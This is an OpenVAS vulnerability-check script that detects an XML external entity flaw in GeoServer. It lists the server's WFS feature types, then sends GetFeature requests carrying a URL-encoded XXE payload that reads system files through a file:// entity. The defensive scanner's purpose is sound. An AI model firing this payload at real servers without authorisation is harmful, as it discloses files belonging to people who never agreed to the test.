###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_geoserver_xxe_08_15.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# Geoserver XML External Entity Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105320");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("$Revision: 11872 $");
  script_name("Geoserver XML External Entity Information Disclosure Vulnerability");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37757/");

  script_tag(name:"impact", value:"An attacker can exploit this issue to gain access to sensitive
information, this may lead to further attacks.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check the response");
  script_tag(name:"insight", value:"An XXE vulnerability in Geoserver allows to view file contents and list directories on the server.");
  script_tag(name:"solution", value:"Update to 2.7.2 or newer.");
  script_tag(name:"summary", value:"The remote Geoserver is vulnerable to XML External Entity attacks.");
  script_tag(name:"affected", value:"2.7 <2.7.1.1  / 2.6 <2.6.4 / 2.5 <2.5.5.1, other versions may be affected too.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-08-17 13:57:49 +0200 (Mon, 17 Aug 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("secpod_geoserver_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("GeoServer/installed");

  exit(0);
}

CPE = 'cpe:/a:geoserver:geoserver';

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

url = dir + '/wfs?request=GetCapabilities';
req = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

feature_list = make_list();

features = eregmatch( pattern:'<FeatureTypeList>(.*)</FeatureTypeList>', string:buf);
if( isnull( features[1] ) ) exit( 0 );

features = split( features[1], sep:'<', keep:TRUE );

foreach line ( features )
{
  if( "Name>" >< line )
  {
    f = eregmatch( pattern:"Name>([^<]+)<", string:line );
    if( ! isnull( f[1] ) )
    {
      feature_list = make_list_unique( feature_list, f[1] );
    }
  }
}

if( max_index( feature_list ) < 1 ) exit( 0 );

files = traversal_files();

foreach file ( keys( files ) )
{
  foreach feature ( feature_list )
  {
    url = dir +
          "/wfs?request=GetFeature&SERVICE=WFS&VERSION=1.0.0&TYPENAME=" + feature + "&FILTER=%3C%3Fxml%20version%3D%221.0%22%20"  +
          "encoding%3D%22ISO-8859-1%22%3F%3E%20%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F/" + files[ file ] +"%22" +
          "%20%3E]%3E%3CFilter%20%3E%3CPropertyIsEqualTo%3E%3CPropertyName%3E%26xxe%3B%3C%2FPropertyName%3E%3CLiteral%3EBrussels%3C" +
          "%2FLiteral%3E%3C%2FPropertyIsEqualTo%3E%3C%2FFilter%3E";

    if( http_vuln_check( port:port, url:url, pattern:file ) )
    {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
